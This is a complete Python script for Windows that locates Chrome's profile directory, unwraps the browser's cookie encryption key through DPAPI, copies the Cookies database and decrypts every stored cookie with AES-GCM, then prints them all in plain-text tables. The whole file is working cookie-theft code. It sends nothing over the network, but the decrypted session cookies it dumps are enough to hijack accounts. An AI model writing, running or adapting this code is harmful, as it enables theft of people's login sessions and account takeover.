import base64
import json
import os
import random
import shutil
import sqlite3
from Cryptodome.Cipher import AES
from prettytable import PrettyTable
import win32crypt
temp_db = None
CHROME_DIRS = [
    'AppData\\Local\\Google\\Chrome\\User Data\\',
]
COOKIES_DIRS = [
    'Network\\Cookies',
    'Default\\Cookies',
    'Default\\Network\\Cookies'
]

def extract_key(base_dir):
    with open(os.path.join(base_dir, 'Local State'), 'rb') as key_file:
        key_data = json.load(key_file)
    encrypted_key = base64.b64decode(key_data["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_data(data, key):
    if data.startswith(b'v10'):
        iv, payload = data[3:15], data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16]
    elif data.startswith(b'\x01\x00\x00\x00'):
        return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1]
    return None

def get_cookie_files_and_keys(base_dirs):
    return {
        os.path.join(base, path): extract_key(base)
        for base in base_dirs for path in COOKIES_DIRS if os.path.isfile(os.path.join(base, path))
    }

def extract_cookies(cookie_files):
    cookies = {}
    global temp_db
    for file, key in cookie_files.items():
        temp_db = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
        shutil.copy2(file, temp_db)
        try:
            with sqlite3.connect(temp_db) as db:
                cursor = db.cursor()
                cursor.execute("SELECT * FROM cookies")
                columns = [col[0] for col in cursor.description]
                rows = [
                    [decrypt_data(row[columns.index("encrypted_value")], key) if col == "encrypted_value" else row[idx]
                     for idx, col in enumerate(columns)]
                    for row in cursor.fetchall()
                ]
            cookies[file] = (columns, rows)
        finally:
            cookies[file] = (columns, rows)
            
    return cookies

def main():
    base_dirs = [os.path.expanduser(f'~\\{chrome_dir}') for chrome_dir in CHROME_DIRS if os.path.exists(os.path.expanduser(f'~\\{chrome_dir}'))]
    cookie_files = get_cookie_files_and_keys(base_dirs)
    cookies = extract_cookies(cookie_files)

    for file, (columns, rows) in cookies.items():
        print(f"\nFile: {file}")
        table = PrettyTable(columns)
        table.add_rows(rows)
        print(table)
    os.remove(temp_db)
if __name__ == "__main__":
    main()
